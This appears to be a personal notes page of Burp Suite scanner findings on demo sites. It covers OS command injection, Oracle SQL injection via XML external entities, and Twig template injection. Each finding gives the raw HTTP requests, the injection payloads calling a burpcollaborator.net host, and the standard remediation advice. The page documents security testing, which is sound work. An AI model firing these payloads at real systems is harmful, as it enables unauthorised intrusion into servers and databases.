---
title: burpsuite
date: 2018-10-06
---

```html
POST/feedback/submitHTTP/1.1
Host:insecure-website.com
User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.14;rv:67.0)Gecko/20100101Firefox/67.0
Accept:*/*
Accept-Language:en-US,en;q=0.5
Accept-Encoding:gzip,deflate
Referer:https://insecure-website.com/feedback
Content-Type:application/x-www-form-urlencoded
Content-Length:95
Connection:close
Cookie:session=5AZnp7FvA6cNx16MMzwa3i3LDOAY4pvZ

csrf=AgPcq8h37cv2FtglRj4PodzvuEYOCeEz&name=test&email=test%40test.com&subject=test%26nslookup%20-q%3dcname%20dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net.%26%60'&message=test
```

The Collaborator server received a DNS lookup of type CNAME for the domain name dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net.  The lookup was received from IP address 54.229.136.232 at 2019-Jun-20 08:58:14 UTC.

```json
 Issue:  
 OS command injection
 Severity:  
 High
 Confidence:  
 Certain
 Host:  
 https://insecure-website.com
 Path:  
 /feedback/submit

   Issue detail
   The subject parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses. However, it is possible to cause the application to interact with an external domain, to verify that a command was executed.  The payload &nslookup -q=cname dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net.&'\"`0&nslookup -q=cname dr8eoesl8e0rlo9geugbvgjwknqge621qtdm1b.burpcollaborator.net.&`' was submitted in the subject parameter. The application performed a DNS lookup for the specified domain name.
   Issue background
   Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.
   OS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application's own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.
   Issue remediation
   If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.
   If it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks:
   The user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.
   The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses
```

# The Collaborator server received a DNS lookup of type A for the domain name pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollaborator.net.  The lookup was received from IP address 52.17.5.255 at 2019-Jun-20 10:21:58 UTC.

```html
GET / HTTP/1.0
Host: pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollaborator.net
Content-Type: text/plain; charset=utf-8
HTTP/1.1 200 OK
Server: Burp Collaborator https://burpcollaborator.net/
X-Collaborator-Version: 4
Content-Type: text/html
Content-Length: 61

<html><body>tpswz8lk5dpgkx6u97xg8tzjlgmgwglfigz</body></html>

 Issue:  
 SQL injection
 Severity:  
 High
 Confidence:  
 Certain
 Host:  
 https://vulnerable-website.com
 Path:  
 /

   Issue detail
   The TrackingId cookie appears to be vulnerable to SQL injection attacks. The payload '||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % waqks SYSTEM "http://pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollab'||'orator.net/">%waqks;]>'),'/l') from dual)||' was submitted in the TrackingId cookie. This payload injects a SQL sub-query that calls Oracle's xmltype function to evaluate some data as XML. The supplied XML defines an external entity that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.  The database appears to be Oracle.
   Issue background
   SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.
   A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.
   Issue remediation
   The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.
   You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:
   One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.
   Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.

# GET /user-homepage?input=bobdj%7b%7b6*'2'%7d%7d%7b%23commentedout%23%7d%7b%7b8*3%7d%7dsl1s0 HTTP/1.1
Host: insecure-bank.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-Type: text/html
Server: Apache/2.4.9 (Unix)
Status: 200 OK
Vary: Accept-Encoding
Date: Thu, 20 Jun 2019 12:43:53 GMT
Content-Length: 322
Connection: close

<head><title>Twig Template Injection</title><style>body { background-color: #D2E1CC; }</style></head><body><h3>Twig Template Injection (unsandboxed)</h3><b>Input: </b>bobdj&#123;&#123;6&#42;&#39;2&#39;&#125;&#125;&#123;&#35;commentedout&#35;&#125;&#123;&#123;8&#42;3&#125;&#125;sl1s0<br/></br><b>Output: </b>bobdj1224sl1s0


 Issue:  
 Server-side template injection
 Severity:  
 High
 Confidence:  
 Certain
 Host:  
 http://insecure-bank.com
 Path:  
 /user-homepage

   Issue detail
   The input parameter appears to be vulnerable to server-side template injection attacks. The template engine appears to be Twig.  The payload bobdj{6*'2'}{#commentedout#}{8*3}sl1s0 was submitted in the input parameter. This payload contains a Twig template statement.  The server response contained the string bobdj1224sl1s0. This indicates that the payload is being interpreted by a server-side template engine.

   Issue background

   Server-side template injection occurs when user input is unsafely embedded into a server-side template, allowing users to inject template directives. Using malicious template directives, an attacker may be able to execute arbitrary code and take full control of the web server.
   The severity of this issue varies depending on the type of template engine being used. Template engines range from being trivial to almost impossible to exploit. The following steps should be used when attempting to develop an exploit:
   Identify the type of template engine being used.
   Review its documentation for basic syntax, security considerations, and built-in methods and variables.
   Explore the template environment and map the attack surface.
   Audit every exposed object and method.
   Template injection vulnerabilities can be very serious and can lead to complete compromise of the application's data and functionality, and often of the server that is hosting the application. It may also be possible to use the server as a platform for further attacks against other systems. On the other hand, some template injection vulnerabilities may pose no significant security risk.
   Issue remediation
   Wherever possible, avoid creating templates from user input. Passing user input into templates as parameters is normally a safe alternative.
   If supporting user-submitted templates is a business requirement, consider using a simple logic-less template engine such as Mustache or one provided by the native language like Python's Template. If this is not an option, review the chosen template engine's documentation for hardening advice, and consider rendering the template within a sandboxed execution environment.
```
